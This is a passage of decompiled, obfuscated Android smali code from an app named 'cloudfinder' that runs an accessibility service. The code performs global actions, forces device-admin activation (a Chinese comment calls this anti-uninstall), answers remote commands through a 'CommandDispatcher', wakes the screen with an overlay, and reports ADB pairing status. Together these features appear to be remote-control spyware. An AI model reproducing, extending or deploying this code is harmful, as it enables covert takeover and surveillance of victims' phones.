    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v3, "ms, permFlowDone written, managers stopped"

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v8, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "SETUP_COMPLETE|elapsed="

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v0, v1}, Ljava/lang/StringBuilder;->append(J)Ljava/lang/StringBuilder;

    const-string v0, "|brand="

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v0, Landroid/os/Build;->BRAND:Ljava/lang/String;

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    move-object/from16 v1, v30

    invoke-static {v1, v0}, Lڝږ؁ڋ/ر;->؋(Ljava/lang/String;Ljava/lang/String;)V

    return-void
.end method


# virtual methods
.method public final run()V
    .locals 10

    iget v0, p0, Lڛڜڕڰڑ/ء;->آ:I

    const-string v1, "MyAccessSvc"

    packed-switch v0, :pswitch_data_0

    goto/16 :goto_5

    :pswitch_0
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const/4 v0, 0x3

    iget-object v1, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v1, v0}, Landroid/accessibilityservice/AccessibilityService;->performGlobalAction(I)Z

    return-void

    :pswitch_1
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-static {v0}, Lڗًقڔ/؋;->پ(Landroid/accessibilityservice/AccessibilityService;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    new-instance v3, Ljava/lang/Thread;

    new-instance v4, Lڛڜڕڰڑ/آ;

    invoke-direct {v4, v1, v2, v0}, Lڛڜڕڰڑ/آ;-><init>(JLcom/lite/cloudfinder/accessibility/MyAccessibilityService;)V

    invoke-direct {v3, v4}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;)V

    invoke-virtual {v3}, Ljava/lang/Thread;->start()V

    return-void

    :pswitch_2
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    # 调试模式：跳过设备管理器激活（防卸载）
    const-string v2, "inject_state"
    const/4 v3, 0x0
    invoke-virtual {v0, v2, v3}, Landroid/content/Context;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;
    move-result-object v2
    const-string v3, "debug_mode"
    const/4 v4, 0x1
    invoke-interface {v2, v3, v4}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z
    move-result v2
    if-eqz v2, :devadmin_go
    return-void

    :devadmin_go
    :try_start_0
    new-instance v2, Landroid/content/Intent;

    const-class v3, Lcom/lite/cloudfinder/activity/DeviceAdminActivity;

    invoke-direct {v2, v0, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const/high16 v3, 0x50000000

    invoke-virtual {v2, v3}, Landroid/content/Intent;->addFlags(I)Landroid/content/Intent;

    invoke-virtual {v0, v2}, Landroid/content/Context;->startActivity(Landroid/content/Intent;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    const-string v2, "DeviceAdminActivity start error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :goto_0
    return-void

    :pswitch_3
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-static {v0}, Lڗًقڔ/؋;->پ(Landroid/accessibilityservice/AccessibilityService;)V

    return-void

    :pswitch_4
    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    sget-object v1, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const/4 v1, 0x1

    sput-boolean v1, Lسۄھؤۏ۫/؋;->د:Z

    invoke-static {v0}, Lڃٷښـ۝ۼ/ؠ;->ص(Landroid/content/Context;)V

    new-instance v1, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v2

    invoke-direct {v1, v2}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v2, Lڛڜڕڰڑ/ء;

    const/16 v3, 0x8

    invoke-direct {v2, v0, v3}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    const-wide/16 v3, 0x1f40

    invoke-virtual {v1, v2, v3, v4}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    return-void

    :pswitch_5
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_1
    invoke-virtual {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٴ()V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_1

    :catch_1
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_1
    return-void

    :pswitch_6
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_2
    invoke-virtual {v0}, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ٴ()V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    goto :goto_2

    :catch_2
    move-exception v0

    invoke-virtual {v0}, Ljava/lang/Throwable;->printStackTrace()V

    :goto_2
    return-void

    :pswitch_7
    invoke-direct {p0}, Lڛڜڕڰڑ/ء;->؋()V

    return-void

    :pswitch_8
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    const-wide/16 v0, 0x7d0

    :try_start_3
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_3
    .catch Ljava/lang/InterruptedException; {:try_start_3 .. :try_end_3} :catch_3

    :catch_3
    new-instance v0, Landroid/os/Handler;

    invoke-static {}, Landroid/os/Looper;->getMainLooper()Landroid/os/Looper;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/os/Handler;-><init>(Landroid/os/Looper;)V

    new-instance v1, Lڛڜڕڰڑ/ء;

    const/4 v2, 0x5

    iget-object v3, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-direct {v1, v3, v2}, Lڛڜڕڰڑ/ء;-><init>(Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;I)V

    invoke-virtual {v0, v1}, Landroid/os/Handler;->post(Ljava/lang/Runnable;)Z

    return-void

    :pswitch_9
    sget-object v0, Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;->ا:Ljava/util/concurrent/ExecutorService;

    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    :try_start_4
    invoke-static {v0}, Lڜأِجطّثٮ/ء;->ة(Landroid/content/Context;)Lڜأِجطّثٮ/ء;

    move-result-object v0

    new-instance v2, Lorg/json/JSONObject;

    invoke-direct {v2}, Lorg/json/JSONObject;-><init>()V

    const-string v3, "type"

    const-string v4, "status"

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    const-string v3, "supported"

    invoke-virtual {v0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "wifi"

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "paired"

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->ج()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "connected"

    invoke-static {}, Lڜأِجطّثٮ/ؠ;->أ()Lڜأِجطّثٮ/ؠ;

    move-result-object v4

    invoke-virtual {v4}, Lڜأِجطّثٮ/ؠ;->ئ()Z

    move-result v4

    invoke-virtual {v2, v3, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Z)Lorg/json/JSONObject;

    const-string v3, "message"

    invoke-static {}, Lڜأِجطّثٮ/ء;->خ()Z

    move-result v4

    if-eqz v4, :cond_1

    invoke-virtual {v0}, Lڜأِجطّثٮ/ء;->د()Z

    move-result v0

    if-eqz v0, :cond_0

    const-string v0, "\u5c31\u7eea"

    goto :goto_3

    :cond_0
    const-string v0, "\u9700\u8981WiFi"

    goto :goto_3

    :cond_1
    const-string v0, "\u9700\u8981Android 11+"

    :goto_3
    invoke-virtual {v2, v3, v0}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    invoke-static {}, Lڜٟٱڀ/د;->ؠ()Lڜٟٱڀ/د;

    move-result-object v0

    if-eqz v0, :cond_2

    invoke-virtual {v0}, Lڜٟٱڀ/د;->آ()Z

    move-result v3

    if-eqz v3, :cond_2

    const-string v3, "adbPairStatus"

    invoke-virtual {v0, v3, v2}, Lڜٟٱڀ/د;->ؤ(Ljava/lang/String;Lorg/json/JSONObject;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto :goto_4

    :catch_4
    move-exception v0

    const-string v2, "ADB status report error"

    invoke-static {v1, v2, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    :cond_2
    :goto_4
    return-void

    :goto_5
    iget-object v0, p0, Lڛڜڕڰڑ/ء;->أ:Lcom/lite/cloudfinder/accessibility/MyAccessibilityService;

    const-string v1, "CommandDispatcher"

    :try_start_5
    const-string v2, "window"

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/view/WindowManager;

    new-instance v3, Landroid/view/View;

    invoke-direct {v3, v0}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v0, Landroid/view/WindowManager$LayoutParams;

    const/4 v5, 0x1

    const/4 v6, 0x1

    const/16 v7, 0x7f0

    const v8, 0x280098

    const/4 v9, -0x3

    move-object v4, v0

    invoke-direct/range {v4 .. v9}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const v4, 0x800033

    iput v4, v0, Landroid/view/WindowManager$LayoutParams;->gravity:I

    invoke-interface {v2, v3, v0}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    new-instance v4, Landroidx/constraintlayout/motion/widget/؋;

    const/16 v5, 0x17

    invoke-direct {v4, v5, v2, v3}, Landroidx/constraintlayout/motion/widget/؋;-><init>(ILjava/lang/Object;Ljava/lang/Object;)V

    const-wide/16 v2, 0xbb8

    invoke-virtual {v0, v4, v2, v3}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    const-string v0, "wakeup: accessibility overlay with TURN_SCREEN_ON added"

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_5

    goto :goto_6

    :catch_5
    move-exception v0

    new-instance v2, Ljava/lang/StringBuilder;

    const-string v3, "wakeup overlay failed: "

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :goto_6
    return-void

    nop

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_9
        :pswitch_8
        :pswitch_7
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch
.end method
